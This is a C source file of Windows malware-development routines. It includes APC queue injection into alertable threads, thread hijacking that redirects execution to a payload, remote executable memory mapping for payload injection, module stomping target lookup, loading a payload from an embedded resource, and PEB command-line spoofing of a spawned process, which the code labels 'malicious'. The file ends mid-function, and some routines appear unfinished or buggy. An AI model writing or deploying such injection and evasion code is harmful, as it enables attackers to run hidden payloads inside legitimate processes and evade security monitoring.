#include "SystemInteraction.h"

VOID AlertableFunction0
(
	void
)
{
	SleepEx(100, TRUE);
	printf("[!] APC \"Sleep Ex\" Fired Back!\n");

}
 
VOID AlertableFunction1
(
	void
)
{
	HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (hEvent) 
	{
		WaitForSingleObjectEx(hEvent, 150, TRUE);
		CloseHandle(hEvent);
	}
	printf("[!] APC \"Wait For Single Objects Ex\" Fired Back!\n");

}

VOID AlertableFunction2
(
	void
)
{
	HANDLE hEvent = CreateEvent(NULL,FALSE, FALSE, NULL);
	if (hEvent) {
		WaitForMultipleObjectsEx(
			1, &hEvent,
			TRUE,
			150, TRUE);
		CloseHandle(hEvent);
	}
	printf("[!] APC \"Wait For Multiple Objects Ex\" Fired Back!\n");
}

VOID AlertableFunction3
(
	void
)
{

	HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (hEvent) {
		MsgWaitForMultipleObjectsEx(
			1, &hEvent, 
			150, QS_KEY, 
			MWMO_ALERTABLE//This line is a must.
		);
		CloseHandle(hEvent);
	}
	printf("[!] APC \"Msg Wait For Multiple Objects Ex\" Fired Back!\n");
}

VOID AlertableFunction4
( 
	void
)
{

	HANDLE hEvent1 = CreateEvent(NULL, NULL, NULL, NULL);
	HANDLE hEvent2 = CreateEvent(NULL, NULL, NULL, NULL);

	if (hEvent1 && hEvent2) {
		SignalObjectAndWait(
			hEvent1, hEvent2, 
			150, 
			TRUE 
		); 		
		CloseHandle(hEvent1);
		CloseHandle(hEvent2);
	}
	printf("[!] APC \"Signal Object And Wait\" Fired Back!\n");

}

VOID BenignFunction
(
	IN    VOID
)
{
	int x;
	if (5 + 5 == 10) x = 12;
	Sleep(x * 1000);
}

BOOLEAN CreateLocalAlertableThread
(
       OUT PHANDLE phThread,
	   OUT PDWORD  pdwThreadId
)
{
	if (!CreateThread(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)AlertableFunction0,
		NULL,
		CREATE_SUSPENDED, 
		pdwThreadId)) return FALSE;

	return TRUE;
}

BOOLEAN CreateSacrificialThread
(
	   OUT PDWORD  pdwSacrificialThreadId,
	   OUT PHANDLE phThreadHandle
)
{
	if (!(*phThreadHandle = CreateThread(
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)&BenignFunction,
		NULL,
		0,
		pdwSacrificialThreadId
	))) return FALSE;

	if (SuspendThread(*phThreadHandle) == -1) return FALSE;

	return TRUE;
}

BOOLEAN CreateDebuggedProcess
(
	IN     PCHAR   pProcessName,
	   OUT PDWORD  pdwProcessId,
	   OUT PHANDLE phProcessHandle,
	   OUT PHANDLE phThreadHandle
)
{
	if (!pProcessName || !pdwProcessId || !phProcessHandle || !phThreadHandle) return FALSE;
	CHAR
		pWnDr[MAX_PATH] = { '\0' },
		pPath[MAX_PATH * 2] = { '\0' };
	STARTUPINFOA
		StartupInfo_t = { .cb = sizeof(STARTUPINFO), 0x00 };
	PROCESS_INFORMATION
		ProcessInfo_t = { 0x00 };

	if (!GetEnvironmentVariableA("WINDIR", pWnDr, MAX_PATH)) return FALSE;

	if (!sprintf_s(pPath, MAX_PATH, "%s\\System32\\%s", pWnDr, pProcessName)) return FALSE;

	if (!CreateProcessA(
		NULL,
		(LPSTR)pPath,
		NULL,
		NULL,
		FALSE,
		DEBUG_PROCESS,
		0,
		NULL,
		&StartupInfo_t,
		&ProcessInfo_t)) return FALSE;

	*pdwProcessId = ProcessInfo_t.dwProcessId;
	*phProcessHandle = ProcessInfo_t.hProcess;
	*phThreadHandle = ProcessInfo_t.hThread;

	if (!*pdwProcessId || !*phProcessHandle || !phThreadHandle) return  FALSE;

	return TRUE;
}

BOOLEAN CreateSuspendedProcess
(
	IN     PCHAR   pProcessName,
	   OUT PDWORD  pdwProcessId,
	   OUT PHANDLE phProcessHandle,
	   OUT PHANDLE phThreadHandle
)
{
	if (!pProcessName || !pdwProcessId || !phProcessHandle || !phThreadHandle) return FALSE;
	CHAR
		pWnDr[MAX_PATH] = { '\0' },
		pPath[MAX_PATH * 2] = { '\0' };
	STARTUPINFOA
		StartupInfo_t = { .cb = sizeof(STARTUPINFO), 0x00 };
	PROCESS_INFORMATION
		ProcessInfo_t = { 0x00 };

	if (!GetEnvironmentVariableA("WINDIR", pWnDr, MAX_PATH)) return FALSE;

	if (!sprintf_s(pPath, MAX_PATH, "%s\\System32\\%s", pWnDr, pProcessName)) return FALSE;

	if (!CreateProcessA(
		NULL,
		(LPSTR)pPath,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED,
		0,
		NULL,
		&StartupInfo_t,
		&ProcessInfo_t)) return FALSE;

	*pdwProcessId = ProcessInfo_t.dwProcessId;
	*phProcessHandle = ProcessInfo_t.hProcess;
	*phThreadHandle = ProcessInfo_t.hThread;

	if (!*pdwProcessId || !*phProcessHandle || !phThreadHandle) return  FALSE;

	return TRUE;
}

BOOLEAN EnumProcessNTQuerySystemInformation
(
	IN     LPCWSTR szProcName,
	   OUT PDWORD  pdwPid,
	   OUT PHANDLE phProcess
)
{
	ULONG                        uReturnLen1, uReturnLen2;
	PSYSTEM_PROCESS_INFORMATION  SystemProcInfo;
	BOOLEAN                      bState = FALSE;
	fnNtQuerySystemInformation   pNtQuerySystemInformation;

	if (!(pNtQuerySystemInformation = (fnNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("NTDLL.DLL"), "NtQuerySystemInformation"))) return FALSE;

	pNtQuerySystemInformation(SystemProcessInformation, NULL, 0, &uReturnLen1);

	if ((SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)LocalAlloc(LPTR, uReturnLen1)) == NULL) return FALSE;

	PVOID pValueToFree = (PVOID)SystemProcInfo;

	if (pNtQuerySystemInformation(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2) != 0) goto _cleanup;
	while (TRUE) {
		if (SystemProcInfo->ImageName.Length && _wcsicmp(SystemProcInfo->ImageName.Buffer, szProcName) == 0) {
			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
			*phProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, *pdwPid);
			if (!*phProcess) goto _cleanup;
			bState = TRUE;
		_cleanup:
			if (SystemProcInfo != NULL) LocalFree(pValueToFree);
			return bState;
		}

		if (!SystemProcInfo->NextEntryOffset) goto _cleanup;
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}
}

BOOLEAN EnumRemoteProcessHandle
(
	IN        LPWSTR   szProcName,
	   OUT    PDWORD   pdwPID,
	   OUT    HANDLE  *phProcess
)
{
	if (!szProcName || !pdwPID || !phProcess) return FALSE;
	HMODULE hModule = NULL;
	BOOLEAN bState = FALSE;
	WCHAR   szProcess[MAX_PATH] = { L'\0' };
	DWORD dwProcesses_arr[2048], dwReturnLen1, dwReturnLen2;

	if (!EnumProcesses(dwProcesses_arr, sizeof(dwProcesses_arr), &dwReturnLen1)) return FALSE;

	USHORT dwPIDAmount = (USHORT)(dwReturnLen1 / sizeof(DWORD));

	for (USHORT i = 0; i < dwPIDAmount; i++)
	{
		HANDLE  hProcess;
		if (!(hProcess = OpenProcess(
			PROCESS_ALL_ACCESS, //Stealthier approach than 
			FALSE,
			dwProcesses_arr[i]
		))) continue;

		if (!EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) goto InnerCleanUp;

		if (!GetModuleBaseName(hProcess, hModule, szProcess, sizeof(szProcess) / sizeof(WCHAR))) goto InnerCleanUp;

		if (_wcsicmp(szProcess, szProcName) == 0)
		{
			*pdwPID = dwProcesses_arr[i];
			*phProcess = hProcess;
			bState = TRUE;
			break;
		}
	InnerCleanUp:
		if (hProcess) CloseHandle(hProcess);
	}

	return bState;
}

BOOLEAN FetchDrives
(
	IN OUT LPWSTR pPath
)
{
	DWORD dwDrivesBitMask = GetLogicalDrives();

	if (dwDrivesBitMask == 0) return FALSE;

	WCHAR base_wchar = L'A';

	USHORT drives_index = 0;

	for (WCHAR loop_index = 0; loop_index <= 26; loop_index++)
	{
		if (dwDrivesBitMask & (1 << loop_index)) {
			pPath[drives_index] = base_wchar + loop_index;
			drives_index++;
		}
	}
	pPath[drives_index] = L'\0';
	return TRUE;
}

LPWIN32_FIND_DATA_ARRAYW FetchFileArrayW
(
	IN    LPWSTR pPath
)
{
	WIN32_FIND_DATAW find_data_t;
	LPWIN32_FIND_DATA_ARRAYW pFiles_arr_t;
	UINT i = 0;
	size_t sArraySize = 3;
	if (
		!(pFiles_arr_t = malloc(sizeof(WIN32_FIND_DATA_ARRAYW)))
		) return NULL;
	if (
		!(pFiles_arr_t->pFilesArr = calloc(sArraySize, sizeof(WIN32_FILE_IN_ARRAY)))
		) return NULL;
	wcscat_s(pPath, MAX_PATH, L"*");

	if (
		(pFiles_arr_t->hBaseFile = FindFirstFileW(pPath, &find_data_t)) == INVALID_HANDLE_VALUE
		) return NULL;

	pPath[wcslen(pPath) - 1] = L'\0';

	while (FindNextFileW(pFiles_arr_t->hBaseFile, &find_data_t))
	{

		if (i >= sArraySize / 2 && !FileBufferRoundUP(&sArraySize, &pFiles_arr_t->pFilesArr)) return NULL;

		size_t sFileName = wcslen(find_data_t.cFileName);
		LPWSTR pFileName;

		if (!(pFileName = calloc(sFileName + 1, sizeof(WCHAR)))) return NULL;
		//if (!(pFiles_arr_t->pFilesArr[i].pFileName = (LPWSTR)calloc(sFileName + 1, sizeof(WCHAR))))
		wcscpy_s(pFileName, sFileName + 1, find_data_t.cFileName);
		pFileName[sFileName] = '\0';
		pFiles_arr_t->pFilesArr[i].pFileName = pFileName;
		pFiles_arr_t->pFilesArr[i].index = i;
		i++;
	}
	pFiles_arr_t->count = i;
	return pFiles_arr_t;
}

BOOLEAN FetchAlertableThread
(
	IN     DWORD   dwMainThreadId,
	IN     DWORD   dwTargetPID,
	   OUT PDWORD  pdwAlertedThreadId,
	   OUT PHANDLE phAlertedThreadHandle
)
{
	if (!dwMainThreadId || !pdwAlertedThreadId || !phAlertedThreadHandle) return FALSE;

	HANDLE hSnapshot;

	if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwTargetPID)) == INVALID_HANDLE_VALUE) return FALSE;

	THREADENTRY32 th32ThreadEtnry_t = { .dwSize = sizeof(THREADENTRY32) };

	if (!Thread32First(hSnapshot, &th32ThreadEtnry_t)) return FALSE;

	BOOLEAN bState = FALSE;
	do
	{
		if (dwTargetPID == th32ThreadEtnry_t.th32OwnerProcessID && dwMainThreadId != th32ThreadEtnry_t.th32ThreadID)
		{
			HANDLE hCandidateThread = INVALID_HANDLE_VALUE;
			if ((hCandidateThread = OpenThread(THREAD_SET_CONTEXT, FALSE, th32ThreadEtnry_t.th32ThreadID)) == INVALID_HANDLE_VALUE) return FALSE;
			if (QueueUserAPC(
				(PAPCFUNC)AlertableFunction0
				, hCandidateThread, 0))
			{
				*phAlertedThreadHandle = hCandidateThread;
				*pdwAlertedThreadId    = th32ThreadEtnry_t.th32ThreadID;
				bState = TRUE;
				QueueUserAPC((PAPCFUNC)AlertableFunction1, hCandidateThread, 0);

				SleepEx(150, TRUE);

				break;
			}
		}
	}
	while (Thread32Next(hSnapshot, &th32ThreadEtnry_t));

	CloseHandle(hSnapshot);
	return bState;
}

BOOLEAN FetchLocalThreadHandle
(
	IN     DWORD   dwMainThreadId,
	   OUT PDWORD  pdwTargetThreadId,
	   OUT PHANDLE phThreadHandle
)
{
	HANDLE        hSnapshot;
	BOOLEAN       bState = FALSE;
	DWORD         dwProcessId = GetCurrentProcessId();
	THREADENTRY32 th32ThreadEntry_t = { .dwSize = sizeof(THREADENTRY32) };


	if (
		(hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)) == INVALID_HANDLE_VALUE
		) goto cleanup;
	if (
		!Thread32First(hSnapshot, &th32ThreadEntry_t)
		) goto cleanup;
	do {
		if (!th32ThreadEntry_t.th32OwnerProcessID) continue;

		if (
			th32ThreadEntry_t.th32OwnerProcessID == dwProcessId && th32ThreadEntry_t.th32ThreadID != dwMainThreadId) goto success;

	} while (Thread32Next(hSnapshot, &th32ThreadEntry_t));

	goto cleanup;

success:
	if (
		!(*phThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, th32ThreadEntry_t.th32ThreadID))
		) goto cleanup;

	*pdwTargetThreadId = th32ThreadEntry_t.th32ThreadID;

	printf("[+] Found A Target Local Thread!\nTID: %lu\n", *pdwTargetThreadId);

	bState = TRUE;
cleanup:
	if (hSnapshot != INVALID_HANDLE_VALUE) CloseHandle(hSnapshot);

	return bState;
}

BOOLEAN FetchProcess
(
	IN     LPWSTR  pProcessName,
	   OUT PDWORD  dwProcessId,
	   OUT PHANDLE phProcessHandle
)
{
	if (!pProcessName || !dwProcessId || !phProcessHandle) return FALSE;

	HANDLE hSnapshot;
	BOOLEAN bState = FALSE;
	PROCESSENTRY32 pe32Process = { .dwSize = sizeof(PROCESSENTRY32) };

	if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE) goto _cleanup;

	if (!Process32First(hSnapshot, &pe32Process)) goto _cleanup;

	do
	{
		if (_wcsicmp(pe32Process.szExeFile, pProcessName) == 0)
		{
			*phProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32Process.th32ProcessID);
			*dwProcessId = pe32Process.th32ProcessID;
			bState = TRUE;
			goto _cleanup;
		}
	} while (Process32Next(hSnapshot, &pe32Process));

_cleanup:
	if (hSnapshot) CloseHandle(hSnapshot);
	return bState;
}

BOOLEAN FetchRemoteThreadHandle
(
	IN     DWORD   dwProcessId, 
	   OUT PDWORD  pdwThreadId,
	   OUT PHANDLE phThreadHandle
)
{
	if (!dwProcessId || !pdwThreadId || !phThreadHandle) return FALSE;

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessId);

	if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

	BOOLEAN bState = FALSE;

	THREADENTRY32 th32Thread_t = { .dwSize = sizeof(THREADENTRY32) };
	
	if (!Thread32First(hSnapshot, &th32Thread_t)) goto cleanup;

	do
	{

		if (th32Thread_t.th32OwnerProcessID == dwProcessId)
		{
			*pdwThreadId    = th32Thread_t.th32ThreadID;
			*phThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, *pdwThreadId);
			if (!*phThreadHandle) goto cleanup;
			bState = TRUE;
			break;
		}

	} while (Thread32Next(hSnapshot, &th32Thread_t));

cleanup:

	CloseHandle(hSnapshot);

	return bState;
}

BOOLEAN FetchResource
(
	   OUT PRESOURCE pResource_t
)
{
	HRSRC hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA2), RT_RCDATA);
	if (!hRsrc) {
		//printf("[X] FindResourceW Failed With Error Code: %x\n", GetLastError());
		return FALSE;
	}

	HGLOBAL hGlobal = LoadResource(NULL, hRsrc);
	if (!hGlobal) {
		//printf("[X] LoadResource Failed With Error Code: %x\n", GetLastError());
		return FALSE;
	}

	pResource_t->pAddress = LockResource(hGlobal);
	if (!pResource_t->pAddress) {
		//printf("LockResource [X] Failed With Error Code: %x\n", GetLastError()); 
		return FALSE;
	}

	pResource_t->sSize = SizeofResource(NULL, hRsrc);
	if (!pResource_t->sSize) {
		//printf("[X] SizeofResource Failed With Error Code: %x\n", GetLastError()); 
		return FALSE;
	}

	return TRUE;
}

BOOLEAN HijackThread
(
	IN     HANDLE hThread,
	IN     PUCHAR pPayloadAddress
)
{
	if (!pPayloadAddress || !hThread) return FALSE;

	SuspendThread(hThread);

	CONTEXT cThreadContext_t = { .ContextFlags = CONTEXT_CONTROL };

	if (!GetThreadContext(hThread, &cThreadContext_t)) return FALSE;

	cThreadContext_t.Rip = (ULONGLONG)pPayloadAddress;

	if (!SetThreadContext(hThread, &cThreadContext_t)) return FALSE;

	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}

BOOLEAN HijackLocalThread
(
	IN     HANDLE hThread, 
	IN     PUCHAR pPayloadAdress,
	IN     SIZE_T sPayloadSize
)
{
	if (!hThread || !pPayloadAdress || !sPayloadSize) return FALSE;

	CONTEXT cThreadCOntext_t = {.ContextFlags =  CONTEXT_CONTROL};
	
	if (!GetThreadContext(hThread, &cThreadCOntext_t))
	{
		SuspendThread(hThread);
		if (!GetThreadContext(hThread, &cThreadCOntext_t))return FALSE;
	}

	PVOID   pExecutionAddress;
	DWORD   dwOldProtections;

	if (!(pExecutionAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) return FALSE;

	memcpy(pExecutionAddress, pPayloadAdress, sPayloadSize);

	cThreadCOntext_t.Rip = (ULONGLONG)pExecutionAddress;

	if (!SetThreadContext(hThread, &cThreadCOntext_t)) return  FALSE;

	if (!VirtualProtect(pExecutionAddress, sPayloadSize, PAGE_EXECUTE_READ , &dwOldProtections)) return FALSE;

	if (ResumeThread(hThread) == -1) return FALSE;

	WaitForSingleObject(hThread, INFINITE);
	
	return TRUE;
}

VOID TestAllertAbleThread
(
	HANDLE hAlertableThreadHandle
)
{
	for (unsigned short i = 0; i < 1000; i++)
	{
		if (!QueueUserAPC((PAPCFUNC)AlertableFunction1, hAlertableThreadHandle, i)) break;
		SleepEx(120, TRUE);
	}
}

LPWIN32_FIND_DATA_ARRAYW RefetchFilesArrayW
(
	IN     LPWSTR pPath,
	   OUT LPWIN32_FIND_DATA_ARRAYW pFiles_arr_t 
)
{
	FreeFileArray(pFiles_arr_t);
	return FetchFileArrayW(pPath);
}
 
BOOLEAN MapLocalMemory
(
	IN     PUCHAR  pPayload,
	   OUT PUCHAR *pMappedAddress,
	IN     SIZE_T  sPayloadSize,
	   OUT PHANDLE phFileMappingHandle 
)
{
	if (!phFileMappingHandle) return FALSE;
	
	BOOLEAN bState = FALSE;

	HANDLE hFile;
	if (!(hFile = CreateFileMappingW(
		INVALID_HANDLE_VALUE,
		NULL,
		PAGE_EXECUTE_READWRITE,
		NULL,
		sPayloadSize,
		NULL
	)))return bState;

	PUCHAR pMappingAddress = MapViewOfFile(
		hFile,
		FILE_MAP_WRITE | FILE_MAP_EXECUTE,
		NULL, NULL,
		sPayloadSize
	);
	if (!pMappingAddress) goto cleanup;
	
	if(!memcpy(pMappingAddress, pPayload, sPayloadSize)) return FALSE;

	bState = TRUE;
cleanup:
	if (hFile) CloseHandle(hFile);
	*pMappedAddress = pMappingAddress;
	return bState;
}

BOOLEAN InjectPayloadRemoteMappedMemory
(
	IN     PUCHAR  pPayload,
	   OUT PUCHAR *pRemoteMappedAddress,
	   OUT PUCHAR *pLocalMappedAddress,
	IN	   SIZE_T  sPayloadSize,
	   OUT PHANDLE phRemoteFileMappingHandle,
	IN     HANDLE  hProcess
)
{
	if (!pPayload || !pRemoteMappedAddress || !sPayloadSize || !phRemoteFileMappingHandle) return FALSE;
		
	
	PVOID pMapLocalAddress = NULL, pMapRemoteAddress = NULL;

	HANDLE hFile = 0;

	if (!(hFile = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL))) return FALSE;

	if (!(pMapLocalAddress = MapViewOfFile(hFile, FILE_MAP_WRITE, NULL, NULL, sPayloadSize))) return FALSE;

	memcpy(pMapLocalAddress, pPayload, sPayloadSize);
	
	if (!(pMapRemoteAddress = MapViewOfFile2(hFile, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READWRITE)))  return FALSE;
	*pLocalMappedAddress  = pMapLocalAddress;
	*pRemoteMappedAddress = pMapRemoteAddress;

	return TRUE;
}

BOOL FetchStompingTarget
(
	IN     LPSTR   pSacrificialDllName,
	IN     LPSTR   pSacrificialFuncName,
	   OUT PVOID* pTargetFunctionAddress
)
{
	if (!pSacrificialDllName || !pSacrificialFuncName || !pTargetFunctionAddress) return FALSE;
	HMODULE hSacrificialModule = NULL;

	if (!(hSacrificialModule = LoadLibraryA(pSacrificialDllName)))
	{
		printf("[!] Failed To Load Dll: %s\n", pSacrificialDllName);
		return FALSE;
	}
	
	if (!(*pTargetFunctionAddress = GetProcAddress(hSacrificialModule, pSacrificialFuncName))) 
	{
		printf("[!] Failed To Load Function: %s\n", pSacrificialFuncName);
		return FALSE;
	}
	return TRUE;
}

BOOLEAN FetchImageDOSHeaderFromPath
(
	IN     LPWCH			  lpImagePath,
	   OUT PIMAGE_DOS_HEADER *pImageDOSHeader_tBaseAddress,
	   OUT PBYTE			 *pImageDataBaseAddress
)
{
	if (!lpImagePath || !pImageDOSHeader_tBaseAddress || !pImageDataBaseAddress) return FALSE;

	DWORD  dwFileSize = 0;
	HANDLE hHeap	  = INVALID_HANDLE_VALUE;
	

	if ((hHeap = GetProcessHeap()) == INVALID_HANDLE_VALUE) return FALSE;

	if (*pImageDataBaseAddress)
	{
		free(*pImageDataBaseAddress);

		*pImageDataBaseAddress = HeapAlloc(hHeap, 0, sizeof(dwFileSize));
	}


	return TRUE;

FailCleanUp:

	HeapFree(hHeap, 0,  *pImageDataBaseAddress);

	return FALSE;
}

UCHAR FetchImageHeaders
(
	IN     HANDLE hTargetProcess,
	   OUT PPEB  *pPEB
)
{
	DWORD						  dwFileSize				 = 0,
								  dwBytesRead				 = 0;
	ULONG						  ulRetren					 = 0;
	HANDLE						  hHeap						 = 0,
							      hFile						 = 0;
	NTSTATUS					  NtStatus					 = 0;
	PPEB						  pProcessEnvironmentBlock_t = NULL;
	PBYTE						  pImageData_t				 = NULL;
	PIMAGE_NT_HEADERS			  pImageNtHeaders			 = NULL;
	PIMAGE_DOS_HEADER			  pImageDOSHeader			 = NULL;
	fnNTQueryProcessInformation   NtQueryProcInfo		     = NULL;
	PRTL_USER_PROCESS_PARAMETERS  pProcessUserParameters     = NULL;
	PIMAGE_BASE_RELOCATION		  pImageBaseRelocationDir    = NULL;
	PIMAGE_TLS_DIRECTORY 		  pImageTLSDirectory		 = NULL;
	PIMAGE_SECTION_HEADER         pImageSectionHeader		 = NULL;
	PIMAGE_RUNTIME_FUNCTION_ENTRY pImageRTFuncEntry_t		 = NULL;
	PIMAGE_IMPORT_DESCRIPTOR      pImageImportDescriptor     = NULL;
	PIMAGE_EXPORT_DIRECTORY 	  pImageExportDirectory_t    = NULL;
	PROCESS_BASIC_INFORMATION	  ProcessBasicInfoBlock_t	 = { 0 };
	IMAGE_FILE_HEADER			  ImageFileHeader_t			 = { 0 };
	IMAGE_OPTIONAL_HEADER		  ImageOptionalHeader_t		 = { 0 };
	IMAGE_DATA_DIRECTORY 		  ImageDataDirectory		 = { 0 };

	if ((hHeap = GetProcessHeap()) == INVALID_HANDLE_VALUE) return 1;

	if ((NtQueryProcInfo = (fnNTQueryProcessInformation)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess")) == NULL) return 2;

	if ((NtStatus = NtQueryProcInfo(hTargetProcess, ProcessBasicInformation, &ProcessBasicInfoBlock_t, sizeof(PROCESS_BASIC_INFORMATION), &ulRetren)) != 0) return 3;

	if((pProcessEnvironmentBlock_t = HeapAlloc(hHeap, 0, sizeof(PEB))) == NULL) return 3;

	if (!ReadStructureFromProcess(hTargetProcess, ProcessBasicInfoBlock_t.PebBaseAddress, (PVOID*)&pProcessEnvironmentBlock_t, sizeof(PEB), hHeap)) return 4;

	if (!ReadStructureFromProcess(
		hTargetProcess, pProcessEnvironmentBlock_t->ProcessParameters,
		(PVOID *) &pProcessUserParameters, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF,
		hHeap)) return 5;

	if (!ReadStructureFromProcess(
		hTargetProcess, pProcessUserParameters->ImagePathName.Buffer,
		(PVOID*)&pProcessUserParameters->ImagePathName.Buffer, pProcessUserParameters->ImagePathName.Length,
		hHeap)) return 5;

	if ((hFile		= CreateFileW(pProcessUserParameters->ImagePathName.Buffer, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)) == INVALID_HANDLE_VALUE) return 6;

	if ((dwFileSize = GetFileSize(hFile, NULL)) == 0) return 8;

	if ((pImageData_t = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwFileSize)) == NULL) return 9;

	if (ReadFile(hFile, pImageData_t, dwFileSize, &dwBytesRead, NULL) == FALSE || dwBytesRead != dwFileSize) return 10;

	pImageDOSHeader			= (PIMAGE_DOS_HEADER)pImageData_t;

	if (pImageDOSHeader->e_magic != IMAGE_DOS_SIGNATURE) return 11;

	pImageNtHeaders			= (PIMAGE_NT_HEADERS)(pImageData_t + pImageDOSHeader->e_lfanew);

	if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) return 12;

	ImageFileHeader_t		= pImageNtHeaders->FileHeader;

	ImageOptionalHeader_t	= pImageNtHeaders->OptionalHeader;

	if (ImageOptionalHeader_t.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC) return 13;

	pImageSectionHeader		= (PIMAGE_SECTION_HEADER)((PBYTE)pImageNtHeaders + sizeof(IMAGE_NT_HEADERS));

	ImageDataDirectory		= ImageOptionalHeader_t.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	pImageExportDirectory_t = (PIMAGE_EXPORT_DIRECTORY)(pImageData_t	   + ImageOptionalHeader_t.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	pImageImportDescriptor  = (PIMAGE_IMPORT_DESCRIPTOR)(pImageData_t	   + ImageOptionalHeader_t.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

	pImageTLSDirectory		= (PIMAGE_TLS_DIRECTORY)(pImageData_t		   + ImageOptionalHeader_t.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress);

	pImageRTFuncEntry_t     = (PIMAGE_RUNTIME_FUNCTION_ENTRY)(pImageData_t + ImageOptionalHeader_t.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress);

	pImageBaseRelocationDir = (PIMAGE_BASE_RELOCATION)(pImageData_t        + ImageOptionalHeader_t.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);

	getchar();
	return 0;
}

BOOLEAN SpoofCommandLineArguments
(
	IN     LPWSTR  pSpoofedCommandLine,
	IN	   LPWSTR  pMaliciousCommandLine,
	IN     DWORD   dwSpoofedcmdLineLength,
	   OUT PHANDLE phProcessHandle,
	   OUT PDWORD  pdwProcessId,
	   OUT PHANDLE phThreadHandle,
	   OUT PDWORD  pdwThreadId
)
{
	if (!pSpoofedCommandLine || !pMaliciousCommandLine || !dwSpoofedcmdLineLength || !phProcessHandle 
	  ||!pdwProcessId		 || !phThreadHandle		   || !pdwThreadId			   ) return FALSE;

	BOOLEAN						  bState				  = FALSE;
	PPEB						  pProcEnvBlock_t		  = NULL;
	fnNTQueryProcessInformation   NtQueryProcInfo		  = NULL;
	PRTL_USER_PROCESS_PARAMETERS  pProcessUserParameters  = NULL;
	ULONG						  ulRetren				  =   0;
	NTSTATUS					  NtStatus				  =   0;
	WCHAR						  pProcess[MAX_PATH]	  = { 0 };
	STARTUPINFOW				  StartupInfo_t			  = { 0 };
	PROCESS_INFORMATION			  ProcessInformation_t    = { 0 };
	PROCESS_BASIC_INFORMATION	  ProcessBasicInfoBlock_t = { 0 };
	HANDLE						  hHeap					  = GetProcessHeap();
	DWORD						  dwExposedLength = sizeof(L"powershell.exe");

	if (!(NtQueryProcInfo = (fnNTQueryProcessInformation)GetProcAddress(GetModuleHandleW(L"NTDLL"), "NtQueryInformationProcess"))) return FALSE;

	StartupInfo_t.cb = sizeof(STARTUPINFOW);

	lstrcpyW(pProcess, pSpoofedCommandLine);

	if (!CreateProcessW(
		NULL, pProcess,
		NULL, NULL,
		FALSE,CREATE_SUSPENDED | CREATE_NO_WINDOW,
		NULL,
		L"C:\\Windows\\System32\\",             // we can use GetEnvironmentVariableW to get this Programmatically
		&StartupInfo_t,
		&ProcessInformation_t)) return FALSE;

	if ((NtStatus = NtQueryProcInfo(
			ProcessInformation_t.hProcess,
			ProcessBasicInformation,
			&ProcessBasicInfoBlock_t,
			sizeof(PROCESS_BASIC_INFORMATION),
			&ulRetren)) != 0) return FALSE;

	pProcEnvBlock_t = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PEB));

	if (!ReadStructureFromProcess(
		ProcessInformation_t.hProcess,
		ProcessBasicInfoBlock_t.PebBaseAddress,
		(PVOID *)&pProcEnvBlock_t,
		sizeof(PEB),
		hHeap
	)) goto EndOfFunc;
	 
	if (!ReadStructureFromProcess(
		ProcessInformation_t.hProcess, pProcEnvBlock_t->ProcessParameters, 
		&pProcessUserParameters, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF, 
		hHeap )) goto EndOfFunc;

	if (!WriteToTargetProcessEnvironmentBlock(
		ProcessInformation_t.hProcess,(PVOID)pProcessUserParameters->CommandLine.Buffer,
		(PVOID)pMaliciousCommandLine, (DWORD)(lstrlenW(pMaliciousCommandLine) * sizeof(WCHAR) + 1)
	)) goto EndOfFunc;
	
	if (!WriteToTargetProcessEnvironmentBlock(
		ProcessInformation_t.hProcess, ((PBYTE)pProcEnvBlock_t->ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)),
		(PVOID)&dwExposedLength, sizeof(DWORD))) goto EndOfFunc;

	*pdwProcessId    = ProcessInformation_t.dwProcessId;
	*phProcessHandle = ProcessInformation_t.hProcess;
	*pdwThreadId     = ProcessInformation_t.dwThreadId;
	*phThreadHandle  = ProcessInformation_t.hThread;

